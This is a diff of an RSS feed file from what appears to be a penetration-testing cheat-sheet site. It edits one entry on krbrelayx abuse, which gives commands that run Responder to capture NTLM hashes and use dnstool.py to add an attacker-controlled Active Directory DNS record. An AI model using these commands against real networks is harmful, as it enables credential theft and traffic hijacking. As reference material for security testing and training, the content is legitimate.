@@ -12,7 +12,7 @@
       <link>https://tldrbins.github.io/krbrelayx/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/krbrelayx/</guid>
-      <description>Abuse #1: Add Active Directory Integrated DNS records via LDAP Linux # Capture NTLM hash sudo responder -I tun0 python3 dnstool.py -u &amp;#39;&amp;lt;DOMAIN&amp;gt;\\&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --action add --record test --data &amp;lt;LOCAL_IP&amp;gt; --type A &amp;lt;DOMAIN&amp;gt; Ref: krbrelayx tools</description>
+      <description>Abuse #1: Add Active Directory Integrated DNS records via LDAP Linux # Capture NTLM hash sudo responder -I tun0 python3 dnstool.py -u &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --action add --record &amp;lt;TARGET_RECORD&amp;gt; --data &amp;lt;LOCAL_IP&amp;gt; &amp;lt;TARGET_IP&amp;gt; Ref: krbrelayx tools</description>
     </item>
   </channel>
 </rss>
